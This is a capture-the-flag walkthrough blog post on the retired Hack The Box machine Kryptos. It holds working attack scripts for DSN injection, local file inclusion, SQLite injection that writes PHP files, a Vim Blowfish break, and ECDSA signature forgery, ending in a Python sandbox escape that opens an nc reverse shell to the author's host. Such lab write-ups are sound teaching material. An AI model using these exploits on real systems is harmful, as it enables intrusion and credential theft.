---
layout: post
title: "Kryptos: Hack The Box Walkthrough"
date: 2019-09-22 02:34:44 +0000
last_modified_at: 2019-09-22 02:34:44 +0000
category: Walkthrough
tags: ["Hack The Box", Kryptos, retired]
comments: true
image:
  feature: kryptos-htb-walkthrough.jpg
  credit: vjkombajn / Pixabay
  creditlink: https://pixabay.com/photos/bitcoin-cryptocurrency-btc-currency-2868704/
---

This post documents the complete walkthrough of Kryptos, a retired vulnerable [VM][1] created by [Adamm][2] and [no0ne][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

Kryptos is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.129 --rate=500

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-04-19 13:49:35 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.129
Discovered open port 80/tcp on 10.10.10.129
```

There's nothing unusual with the ports. Let's do one better with `nmap` scanning the discovered ports for services.

```
# nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.129
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2c:b3:7e:10:fa:91:f3:6c:4a:cc:d7:f4:88:0f:08:90 (RSA)
|   256 0c:cd:47:2b:96:a2:50:5e:99:bf:bd:d0:de:05:5d:ed (ECDSA)
|_  256 e6:5a:cb:c8:dc:be:06:04:cf:db:3a:96:e7:5a:d5:aa (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cryptor Login
```

Here's how the `http` service looks like.

<a class="image-popup">
![7994f3a0.png](/assets/images/posts/kryptos-htb-walkthrough/7994f3a0.png)
</a>

## Directory/File Enumeration

Let's see what we can find with `gobuster` and a solid wordlist.

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 20 -x php,txt,log,htm,html -e -u http://10.10.10.129/                     

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.129/
[+] Threads      : 20
[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,log,htm,html,php
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2019/04/19 14:58:37 Starting gobuster
=====================================================
http://10.10.10.129/css (Status: 301)
http://10.10.10.129/logout.php (Status: 302)
http://10.10.10.129/dev (Status: 403)
http://10.10.10.129/index.php (Status: 200)
http://10.10.10.129/url.php (Status: 200)
http://10.10.10.129/server-status (Status: 403)
http://10.10.10.129/encrypt.php (Status: 302)
http://10.10.10.129/aes.php (Status: 200)
=====================================================
2019/04/19 15:16:56 Finished
=====================================================
```

Looks good. I'll just have to keep these in mind while I explore other parts of the `http` service.

## HTML Source

Let's check out the behavior if we just login with the credential (`admin:admin`).

<a class="image-popup">
![17c74087.png](/assets/images/posts/kryptos-htb-walkthrough/17c74087.png)
</a>

Nothing fancy. Most likely brute-force isn't the way in. Worse still, the site might have `fail2ban` to prevent brute-forcing. Anyway, this is how the HTML source code looks like.

<a class="image-popup">
![c626d5c2.png](/assets/images/posts/kryptos-htb-walkthrough/73841380.png)
</a>

Notice the two hidden fields? `db` is the more interesting of the two; `token` is probably a anti-CSRF token. What happens if we mess with the `db` field?

We can use the browser's element inspector to modify the value of `db`.

<a class="image-popup">
![bab1f306.png](/assets/images/posts/kryptos-htb-walkthrough/bab1f306.png)
</a>

What do we have here?

<a class="image-popup">
![07c5a6d2.png](/assets/images/posts/kryptos-htb-walkthrough/07c5a6d2.png)
</a>

The error message seems to suggest the use of PHP Data Objects (PDO). Let's change it to `information_schema`, a well-known database in MySQL and MariaDB, and see what happens.

<a class="image-popup">
![ad2a01cf.png](/assets/images/posts/kryptos-htb-walkthrough/ad2a01cf.png)
</a>

And what do we get?

<a class="image-popup">
![6c465479.png](/assets/images/posts/kryptos-htb-walkthrough/6c465479.png)
</a>

Hmm. I think I know what's going on here. The login page uses PDO to query a MySQL or MariaDB database server. It doesn't matter what credentials you use, as long as the database returns a valid result, access is granted.

## PHP Data Objects (PDO) Data Source Name (DSN)

According to the PDO [manual](https://www.php.net/manual/en/book.pdo.php),

> The PHP Data Objects (PDO) extension defines a lightweight, consistent interface for accessing databases in PHP. Each database driver that implements the PDO interface can expose database-specific features as regular extension functions. Note that you cannot perform any database functions using the PDO extension by itself; you must use a database-specific PDO driver to access a database server.

To access a database server, you need a database-specific PDO driver. We have more or less determine the database server to be MySQL or MariaDB, what's left is the database source name (DSN).

<a class="image-popup">
![3a69d0e1.png](/assets/images/posts/kryptos-htb-walkthrough/3a69d0e1.png)
</a>

And since we can control the `dbname` portion of the DSN, we can do something like this.

```
cryptor;host=10.10.15.127
```

Where `10.10.15.127` is my IP address and see what goes.

<a class="image-popup">
![46c3feb6.png](/assets/images/posts/kryptos-htb-walkthrough/46c3feb6.png)
</a>

Meanwhile, I set up `tcpdump` to check out incoming connections from `10.10.10.129`.

<a class="image-popup">
![662924a1.png](/assets/images/posts/kryptos-htb-walkthrough/662924a1.png)
</a>

You can see that an incoming connection (SYN) to my IP addresss at `3306/tcp`. As far as I'm aware, the PDO constructor takes in a DSN string, along with the username and password to access database servers. So, if I set up a fake MySQL server, I can probably capture the username and password. Sounds like a plan and Metasploit has an auxiliary module just for that!

<a class="image-popup">
![7e567248.png](/assets/images/posts/kryptos-htb-walkthrough/7e567248.png)
</a>

The captured `JOHNPWFILE` can be easily fed to JtR for password recovery.

<a class="image-popup">
![a8e9bc33.png](/assets/images/posts/kryptos-htb-walkthrough/a8e9bc33.png)
</a>

The credential to access the database `cryptor` is (`dbuser:krypt0n1te`). It's a shame we can't capture the SQL queries sent our way. For that, we need to set a real MySQL server and `tail` off the logs.

To do that, I've set up MariaDB server on my attacking machine. We also need to modify the default configurations in order to capture the SQL queries.

_Bind to IP address_

<a class="image-popup">
![f12d38e1.png](/assets/images/posts/kryptos-htb-walkthrough/f12d38e1.png)
</a>

_Enable SQL queries logging_

<a class="image-popup">
![e46a94fc.png](/assets/images/posts/kryptos-htb-walkthrough/e46a94fc.png)
</a>

With these options set, we can go ahead and start the server. Once that's done, we need to create an empty database `cryptor`, as well as user `dbuser` with password `krypt0n1te`, and grant ALL PERMISSIONS to `cryptor` database like so.

<a class="image-popup">
![1004b517.png](/assets/images/posts/kryptos-htb-walkthrough/1004b517.png)
</a>

At long last, we can catch a glimpse of the SQL query sent.

<a class="image-popup">
![9aec2af6.png](/assets/images/posts/kryptos-htb-walkthrough/9aec2af6.png)
</a>

So, if I create a table `users` with username `admin` and password `21232f297a57a5a743894a0e4a801fc3`, I can return a valid result and thereby, fooling the login page to grant me access.

<a class="image-popup">
![5e9079e7.png](/assets/images/posts/kryptos-htb-walkthrough/5e9079e7.png)
</a>

Let's give it a shot.

<a class="image-popup">
![51210c90.png](/assets/images/posts/kryptos-htb-walkthrough/51210c90.png)
</a>

Sweet.

## Messing with RC4

Long story short, while I was messing with the ciphers, I noticed that the RC4 cipher is nothing more than XORing each byte of the plaintext with some specific byte. Let me illustrate with an example.

Suppose I create a file with a single character "a" and host the file with Python's SimpleHTTPServer.

<a class="image-popup">
![849a1f60.png](/assets/images/posts/kryptos-htb-walkthrough/849a1f60.png)
</a>

And I encrypt the file with `encrypt.php`.

<a class="image-popup">
![7ae0fe9f.png](/assets/images/posts/kryptos-htb-walkthrough/7ae0fe9f.png)
</a>

This is what I get. Let's decode it back to its hexadecimal representation.

<a class="image-popup">
![fb459c64.png](/assets/images/posts/kryptos-htb-walkthrough/fb459c64.png)
</a>

So, `0x61` gets you `0x39`. The XOR between the two is `0x58`. Extending this observation further, if we create a file of `n` null bytes, we can get the XOR key of `n` bytes.

<a class="image-popup">
![215a3ce7.png](/assets/images/posts/kryptos-htb-walkthrough/215a3ce7.png)
</a>

Here's what we get.

<a class="image-popup">
![7a0c8f59.png](/assets/images/posts/kryptos-htb-walkthrough/7a0c8f59.png)
</a>

Decode the above to retrieve the XOR key.

<a class="image-popup">
![f667e7ab.png](/assets/images/posts/kryptos-htb-walkthrough/f667e7ab.png)
</a>

Notice the first byte is `0x58` as it should be. Towards that end, I wrote a simple Python decryptor for the so-called "RC4" scheme.

<div class="filename"><span>xor.py</span></div>

```python
#!/usr/bin/env python

from itertools import izip
import base64
import os
import sys

data = base64.b64decode(sys.argv[1])
key = open('key', 'rb').read()

x = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, key[:len(data)]))

os.write(1, x)
```

I also obtained a 512KB XOR key file, conveniently named as `key`, in case the files that I want to read are huge.

## Not your usual LFI

Now that we have the decryption out of the way, it\'s time to figure out how to read files off the machine. I first noticed that I was able to read `/server-status`, which is normally `403 Forbidden`, when I used the local hostname (which I assume to be `kryptos`) in the URL like so:

<a class="image-popup">
![acbfbb2b.png](/assets/images/posts/kryptos-htb-walkthrough/acbfbb2b.png)
</a>

Another observation was that the URL parameter must begin with `http://`. Well, the encrypted text was decrypted to:

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html><head>
<title>Apache Status</title>
</head><body>
<h1>Apache Server Status for kryptos (via 127.0.1.1)</h1>

<dl><dt>Server Version: Apache/2.4.29 (Ubuntu)</dt>
<dt>Server MPM: prefork</dt>
<dt>Server Built: 2018-10-10T18:59:25
</dt></dl><hr /><dl>
<dt>Current Time: Wednesday, 08-May-2019 09:24:47 BST</dt>
<dt>Restart Time: Wednesday, 08-May-2019 05:13:08 BST</dt>
<dt>Parent Server Config. Generation: 1</dt>
<dt>Parent Server MPM Generation: 0</dt>
<dt>Server uptime:  4 hours 11 minutes 39 seconds</dt>
<dt>Server load: 0.01 0.01 0.00</dt>
<dt>Total accesses: 174 - Total Traffic: 561 kB</dt>
<dt>CPU Usage: u.1 s.05 cu0 cs0 - .000993% CPU load</dt>
<dt>.0115 requests/sec - 38 B/second - 3301 B/request</dt>
<dt>2 requests currently being processed, 5 idle workers</dt>
...
```

Earlier on, the directory enumeration found one `403 Forbidden`, which was `dev`. Extending my observation to include `dev`, the decrypted text is:

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://kryptos/dev/">here</a>.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at kryptos Port 80</address>
</body></html>
```

Surely this is encouraging. Let's pop that trailing `/` in.

```html
<html>
    <head>
    </head>
    <body>
        <div class="menu">
            <a href="index.php">Main Page</a>
            <a href="index.php?view=about">About</a>
            <a href="index.php?view=todo">ToDo</a>
        </div>
</body>
</html>
```

Boom. Long story short, the LFI vulnerability lies with the `view` parameter and I wrote the following script to exploit this vulnerability to read files and display them to `stdout`.

<div class="filename"><span>holycow.sh</span></div>

```bash
#!/bin/bash

IP=$(ifconfig | grep -A1 tun0 | sed '2!d' | awk '{ print $2 }')
HOST=10.10.10.129
HOSTNAME=kryptos
FILE=$1
LFI="php://filter/convert.base64-encode/resource=$FILE"
VIEW="http://$HOSTNAME/dev/index.php?view=$LFI"
CIPHER="encrypt.php?cipher=RC4&url=$VIEW"

TOKEN=$(curl -c cookie \
             -s \
             http://$HOST \
        | grep token \
        | cut -d'"' -f6)

# login
curl -b cookie \
     -s \
     -o /dev/null \
     -d "username=admin" \
     -d "password=admin" \
     -d "db=cryptor%3Bhost%3D$IP" \
     -d "token=$TOKEN" \
     -d "login=" \
     "http://$HOST/index.php"

# encrypt
RC4=$(curl -b cookie \
           -s \
           "http://$HOST/$CIPHER" \
      | sed -r '/<textarea/,/<\/textarea>/!d' \
      | head -1 \
      | cut -d'>' -f2 \
      | cut -d'<' -f1)

# decrypt
python xor.py "$RC4" \
| sed '10!d' \
| cut -d'<' -f1 \
| base64 -d

# clean up
rm -f cookie
```

Armed with this script, I was able to read all the PHP files, including the ones in `/dev`.

```
# ./holycow.sh ../encrypt
```

Here's what `encrypt.php` looks like.

<div class="filename"><span>encrypt.php</span></div>

```php
<?php
//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);

include "aes.php";
include "rc4.php";
include "url.php";
$key = "s3cr3t_crypto_KEY";
session_start();
$err = "";
if (isset($_SESSION['login'])) {
    $res = "";
    if (isset($_GET["url"])) {
        if (substr($_GET["url"], 0, 7) === "http://") {
            $page = get_contents($_GET["url"]);
            if (strlen($page) === 0) {
                $err = "File not found or it was empty!";
            } else {
                //echo $page;
                $cipher = $_GET['cipher'];
                if ($cipher === 'RC4') {
                    $res = base64_encode(rc4($key, $page));
                } elseif ($cipher === 'AES-CBC') {
                    $res = base64_encode(aes_cbc($key, $page));
                } else {
                    $res = "";
                    $err = "Wrong cipher!";
                }
            }
        } else {
            $err = "Only http scheme is supported at the moment!";
        }
    }
} else {
    header("location: index.php");
    die();
}
?>
```

There's the secret encryption key :wink:

```
# ./holycow.sh sqlite_test_page
```

Here's what `sqlite_test_page.php` looks like.

<div class="filename"><span>sqlite_test_page.php</span></div>

```php
<?php
$no_results = $_GET['no_results'];
$bookid = $_GET['bookid'];
$query = "SELECT * FROM books WHERE id=".$bookid;
if (isset($bookid)) {
   class MyDB extends SQLite3
   {
      function __construct()
      {
	 // This folder is world writable - to be able to create/modify databases from PHP code
         $this->open('d9e28afcf0b274a5e0542abb67db0784/books.db');
      }
   }
   $db = new MyDB();
   if(!$db){
      echo $db->lastErrorMsg();
   } else {
      echo "Opened database successfully\n";
   }
   echo "Query : ".$query."\n";

if (isset($no_results)) {
   $ret = $db->exec($query);
   if($ret==FALSE)
    {
	echo "Error : ".$db->lastErrorMsg();
    }
}
else
{
   $ret = $db->query($query);
   while($row = $ret->fetchArray(SQLITE3_ASSOC) ){
      echo "Name = ". $row['name'] . "\n";
   }
   if($ret==FALSE)
    {
	echo "Error : ".$db->lastErrorMsg();
    }
   $db->close();
}
}
?>
```

There's the secret location that's world-writable and also two types of SQLite3 SQL query execution, [SQLite3::exec](https://www.php.net/manual/en/sqlite3.exec.php) and [SQLite3::query](https://www.php.net/manual/en/sqlite3.query.php) :wink:

We can make use of SQLite3::exec to write a PHP file at the world-writable directory, bearing in mind the creator might have already disabled all useful PHP functions in gaining a shell.

I should probably re-purpose my `holycow.sh` script to `write.sh` to write PHP file to the secret location and another one `read.sh` to read files off the secret location. `write.sh` takes in two arguments: filename and the PHP code. `read.sh` takes in one argument: filename from `write.sh`.

<div class="filename"><span>write.sh</span></div>

```bash
#!/bin/bash

IP=$(ifconfig | grep -A1 tun0 | sed '2!d' | awk '{ print $2 }')
COOKIE=$(mktemp -u)
HOST=10.10.10.129
HOSTNAME=kryptos
FILE=$1
NAME="${FILE%.*}"
DOCROOT=/var/www/html
SECRET=dev/d9e28afcf0b274a5e0542abb67db0784
PHPCODE=$2
QUERY="; ATTACH DATABASE '$DOCROOT/$SECRET/$FILE' as $NAME; CREATE TABLE $NAME.$NAME (data TEXT); INSERT INTO $NAME.$NAME (data) VALUES ('$PHPCODE');--"
QUERY=$(urlencode "$QUERY")
SQLITE="http://$HOSTNAME/dev/sqlite_test_page.php?no_results&bookid=1$QUERY"
SQLITE=$(urlencode "$SQLITE")
CIPHER="encrypt.php?cipher=RC4&url=$SQLITE"

TOKEN=$(curl -c $COOKIE \
             -s \
             http://$HOST \
        | grep token \
        | cut -d'"' -f6)

# login
curl -b $COOKIE \
     -s \
     -o /dev/null \
     -d "username=admin" \
     -d "password=admin" \
     -d "db=cryptor%3Bhost%3D$IP" \
     -d "token=$TOKEN" \
     -d "login=" \
     "http://$HOST/index.php"

# encrypt
RC4=$(curl -b $COOKIE \
           -s \
           "http://$HOST/$CIPHER" \
      | sed -r '/<textarea/,/<\/textarea>/!d' \
      | head -1 \
      | cut -d'>' -f2 \
      | cut -d'<' -f1)

# decrypt
python xor.py "$RC4"

# clean up
rm -f $COOKIE
```

Let\'s give it a shot.

<a class="image-popup">
![e268c9c7.png](/assets/images/posts/kryptos-htb-walkthrough/e268c9c7.png)
</a>

Looks good. Here's the code to `read.sh`.

<div class="filename"><span>read.sh</span></div>

```bash
#!/bin/bash

IP=$(ifconfig | grep -A1 tun0 | sed '2!d' | awk '{ print $2 }')
COOKIE=$(mktemp -u)
HOST=10.10.10.129
HOSTNAME=kryptos
FILE=$1
NAME="${FILE%.*}"
DOCROOT=/var/www/html
SECRET=dev/d9e28afcf0b274a5e0542abb67db0784
README="http://$HOSTNAME/$SECRET/$FILE"
README=$(urlencode "$README")
CIPHER="encrypt.php?cipher=RC4&url=$README"

TOKEN=$(curl -c $COOKIE \
             -s \
             http://$HOST \
        | grep token \
        | cut -d'"' -f6)

# login
curl -b $COOKIE \
     -s \
     -o /dev/null \
     -d "username=admin" \
     -d "password=admin" \
     -d "db=cryptor%3Bhost%3D$IP" \
     -d "token=$TOKEN" \
     -d "login=" \
     "http://$HOST/index.php"

# encrypt
RC4=$(curl -b $COOKIE \
           -s \
           "http://$HOST/$CIPHER" \
      | sed -r '/<textarea/,/<\/textarea>/!d' \
      | head -1 \
      | cut -d'>' -f2 \
      | cut -d'<' -f1)

# decrypt
python xor.py "$RC4" \
| sed '1,5d'

# clean up
rm -f $COOKIE
```

Let\'s give a shot to `read.sh`.

```
# ./read.sh info.php > info.html
```

<a class="image-popup">
![1ffdb626.png](/assets/images/posts/kryptos-htb-walkthrough/1ffdb626.png)
</a>

Plenty of disabled functions :angry:

## Getting a Low-Privilege Shell

Looks like I can only perform very specific PHP functions like `scandir`, `file_get_contents`, etc. Well, let's go ahead and create specific PHP files, `ls.php` and `cat.php`, corresponding to their Linux counterparts respectively.

```
# ./write.sh ls.php '<?php echo "\n\n\n\n\n"; print_r(scandir($_GET[0])); ?>'
# ./write.sh cat.php '<?php echo "\n\n\n\n\n"; echo base64_encode(file_get_contents($_GET[0])); ?>'
```

It's customary to read `/etc/passwd`.

```
# ./read.sh cat.php?0=/etc/passwd | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rijndael:x:1001:1001:,,,:/home/rijndael:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
```

## Breaking `set cryptmethod=blowfish` in Vim

Long story short, I found a file `creds.txt`, which was encrypted by Blowfish (`set cryptmethod=blowfish`) in Vim. There isn\'t any weakness with Blowfish (a block cipher) per se, the weakness is how Vim chose to use Blowfish: the first 64-bytes or eight blocks (8-byte block) of plaintext are encrypted with the same IV, reducing the cryptosystem to a mere XOR operation of each block with a fixed-length XOR key (yes, a 8-byte key). You can see this weakness when you encrypt a plaintext of say, 24 characters of "A" for example, repeating bytes appear.

```
# perl -e 'print "A" x 24' > test.txt
# vim --cmd 'set cm=blowfish' -c 'set key=whatever' -c w -c q test.txt
# xxd test.txt
```

<a class="image-popup">
![577cde29.png](/assets/images/posts/kryptos-htb-walkthrough/577cde29.png)
</a>

What this means is that each block of plaintext is XOR'd by the same key, resulting in three identical cipher blocks illustrated above. We can retrieve the key by XOR'ing the first cipher block with the first plaintext block, so on and so forth.

<pre>
<i>key = ciphertext<sub>i</sub> XOR plaintext<sub>i</sub></i> where <i>i</i> is the n<sup>th</sup> block
</pre>

Armed with this knowledge, we can easily re-purpose our `xor.py` to `decrypt.py` like so, which is nothing more than a rolling XOR script.

<div class="filename"><span>decrypt.py</span></div>

```python
#!/usr/bin/env python

from itertools import izip, cycle
import os
import sys

data = open(sys.argv[1], 'rb').read()
key  = open(sys.argv[2], 'rb').read()

x = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))

os.write(1, x)
```

We also have `creds.old`.

```
rijndael / Password1
```

If I had to guess, I would say that the password has probably changed and it's encrypted in `creds.txt`. Well, suppose the decrypted `creds.txt` is more or less like `creds.old` , the username should remains the same, and guess what, `rijndael` is eight characters or bytes. :wink:

Time to decrypt that thing!

...

```
# dd if=creds.txt of=ciphertext skip=28 bs=1 status=none
# dd if=ciphertext of=cipherblock count=8 bs=1 status=none
# echo -n 'rijndael' > plainblock
# ./decrypt.py cipherblock plainblock > key
# ./decrypt.py ciphertext key
rijndael / bkVBL8Q9HuBSpj
```

Boom. We have a winner!

## Low-Privilege Shell

Finally...

<a class="image-popup">
![1be2e8c4.png](/assets/images/posts/kryptos-htb-walkthrough/1be2e8c4.png)
</a>

No surprise. The file `user.txt` is here at the home directory.

<a class="image-popup">
![0d459211.png](/assets/images/posts/kryptos-htb-walkthrough/0d459211.png)
</a>

## Privilege Escalation

During enumeration of `rijndael`'s account, I noticed that `81/tcp` is listening on the loopback interface, powered by `/root/kryptos.py`. The script was running as `root`. I guess that pretty much sums up the privilege escalation approach.

Let's forward our local port to the remote port with SSH like so.

```
# ssh -L 81:127.0.0.1:81 rijndael@10.10.10.129 -f -N
```

<a class="image-popup">
![a38cb190.png](/assets/images/posts/kryptos-htb-walkthrough/a38cb190.png)
</a>

Turns out that there's a copy of `kryptos.py` in `rijndael`'s home directory at the `kryptos` directory.

<div class="filename"><span>kryptos.py</span></div>

```python
import random
import json
import hashlib
import binascii
from ecdsa import VerifyingKey, SigningKey, NIST384p
from bottle import route, run, request, debug
from bottle import hook
from bottle import response as resp


def secure_rng(seed):
    # Taken from the internet - probably secure
    p = 2147483647
    g = 2255412

    keyLength = 32
    ret = 0
    ths = round((p-1)/2)
    for i in range(keyLength*8):
        seed = pow(g,seed,p)
        if seed > ths:
            ret += 2**i
    return ret

# Set up the keys
seed = random.getrandbits(128)
rand = secure_rng(seed) + 1
sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
vk = sk.get_verifying_key()

def verify(msg, sig):
    try:
        return vk.verify(binascii.unhexlify(sig), msg)
    except:
        return False

def sign(msg):
    return binascii.hexlify(sk.sign(msg))

@route('/', method='GET')
def web_root():
    response = {'response':
                {
                    'Application': 'Kryptos Test Web Server',
                    'Status': 'running'
                }
                }
    return json.dumps(response, sort_keys=True, indent=2)

@route('/eval', method='POST')
def evaluate():
    try:
        req_data = request.json
        expr = req_data['expr']
        sig = req_data['sig']
        # Only signed expressions will be evaluated
        if not verify(str.encode(expr), str.encode(sig)):
            return "Bad signature"
        result = eval(expr, {'__builtins__':None}) # Builtins are removed, this should be pretty safe
        response = {'response':
                    {
                        'Expression': expr,
                        'Result': str(result)
                    }
                    }
        return json.dumps(response, sort_keys=True, indent=2)
    except:
        return "Error"

# Generate a sample expression and signature for debugging purposes
@route('/debug', method='GET')
def debug():
    expr = '2+2'
    sig = sign(str.encode(expr))
    response = {'response':
                {
                    'Expression': expr,
                    'Signature': sig.decode()
                }
                }
    return json.dumps(response, sort_keys=True, indent=2)

run(host='127.0.0.1', port=81, reloader=True)
```

Any cryptosystem is only as strong as its weakest link, and in this case, the weakest link is the pseudo-random number generator. Towards that end, I wrote test code to generate a long list of random numbers and found out that the numbers generated were not-so-secure. Given a big enough sample size, the `secure_rng` function generates repeated numbers, which in turn, produce deterministic signing keys, since the signing key is "seeded" from this random number. There's a high chance of collision between my signing key and the server's signing key because of this deterministic seed. Here's the code.

<div class="filename"><span>exploit.py</span></div>

```python
import random
import json   
import hashlib
import binascii
from ecdsa import VerifyingKey, SigningKey, NIST384p
import base64
import requests
import sys

# not-so-secure PRNG ;)
def secure_rng(seed):
  # Taken from the internet - probably secure
  p = 2147483647
  g = 2255412

  keyLength = 32
  ret = 0
  ths = round((p-1)/2)
  for i in range(keyLength*8):
    seed = pow(g,seed,p)
    if seed > ths:
      ret += 2**i
  return ret

# sign
def sign(sk, msg):
    return binascii.hexlify(sk.sign(msg))

# Generate n not-so-secure random numbers
def generate_randoms(n):
  randoms = []
  for _ in range(n):
    seed = random.getrandbits(128)
    rand = secure_rng(seed) + 1
    randoms.append(rand)
  return randoms

# generate signing keys
def generate_keys(x):
  keys = []
  for _ in x:
    sk = SigningKey.from_secret_exponent(_, curve=NIST384p)
    keys.append(sk)
  return keys

# generate not-so-secure random numbers
n = int(sys.argv[1])
print("[+] Generating %d not-so-secure random numbers" % n)
random_numbers = generate_randoms(n)
unique_numbers = list(set(random_numbers))
print("[+] We got %d unique numbers" % len(unique_numbers))

# generate signing keys
print("[+] Generating signing keys from unique numbers")
keys = generate_keys(unique_numbers)

# Here goes nothing...
expr = sys.argv[2] # change this to a malicious expression
print("[+] Expression: %s" % expr)

for key in keys:
  json = {'expr': expr, "sig": sign(key, str.encode(expr)).decode()}
  headers = {'Content-Type': 'application/json'}
  r = requests.post('http://127.0.0.1:81/eval', json=json, headers=headers)

  if "Bad" not in r.text and "Error" not in r.text:
    print (r.text)
    exit()
```

During my experiment, I found that a sample size of 500 generates enough signing key collisions that will eventually create a valid signature to fool the server to evaluate my expression.

<a class="image-popup">
![55d50510.png](/assets/images/posts/kryptos-htb-walkthrough/55d50510.png)
</a>

The next hurdle is to bypass `eval(expr, {'__builtins__':None})`. It can be challenging if you are not familiar with Python internals. ***Everything in Python is an object.*** As long as we have access to the object class, we can make use of Python's internal functions and attributes in the current scope to retrieve `__builtins__`, even if it's set to `None`.

```
# python3 exploit.py 500 "{}.__class__.__mro__[1].__subclasses__()[121].__init__.__globals__['__builtins__']['__import__']('os').system('rm -f /tmp/p; mknod /tmp/p p; /bin/bash </tmp/p | nc 10.10.15.127 1234 >/tmp/p')"
```

Here, I'm using the `warnings` module, to import the `os` module, in order to execute a reverse shell command through `os.system`.

<a class="image-popup">
![8011f698.png](/assets/images/posts/kryptos-htb-walkthrough/8011f698.png)
</a>

From here on, it\'s trivial to [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) to a fully functioning shell and retrieve `root.txt`.

<a class="image-popup">
![7d946056.png](/assets/images/posts/kryptos-htb-walkthrough/7d946056.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/183
[2]: https://www.hackthebox.eu/home/users/profile/2571
[3]: https://www.hackthebox.eu/home/users/profile/21927
[4]: https://www.hackthebox.eu/
